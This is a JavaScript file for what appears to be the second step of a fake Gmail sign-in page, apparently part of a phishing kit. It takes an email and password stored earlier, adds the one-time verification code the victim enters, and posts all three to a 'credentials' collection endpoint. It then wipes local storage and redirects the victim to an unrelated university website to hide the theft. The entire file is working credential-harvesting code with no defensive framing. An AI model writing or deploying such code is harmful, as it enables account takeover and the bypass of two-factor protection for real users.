const baseUrl = "http://localhost:8080/api/v1/credentials";
const campo = document.querySelector("md-outlined-text-field");

document.addEventListener("DOMContentLoaded", () => {
  const gmail = localStorage.getItem("gmail") ?? "";

  if (!gmail) return (window.location.href = "/signin/gmail");
  document.querySelector("md-assist-chip").setAttribute("label", gmail);
});

document.querySelector("form").addEventListener("submit", async (evt) => {
  evt.preventDefault();

  const email = localStorage.getItem("gmail") ?? "";
  const password = localStorage.getItem("password") ?? "";
  const formData = { email, password, otp: campo.value };

  if (!email || !password) return (window.location.href = "/signin/gmail");

  console.log(formData);

  const resp = await fetch(`${baseUrl}/google`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(formData),
  });
  const data = await resp.json();

  if (!resp.ok) console.error("Error al registrar las credenciales.");
  console.log(data);

  localStorage.clear();
  window.location.replace("https://tramifes.aragon.unam.mx/");
});
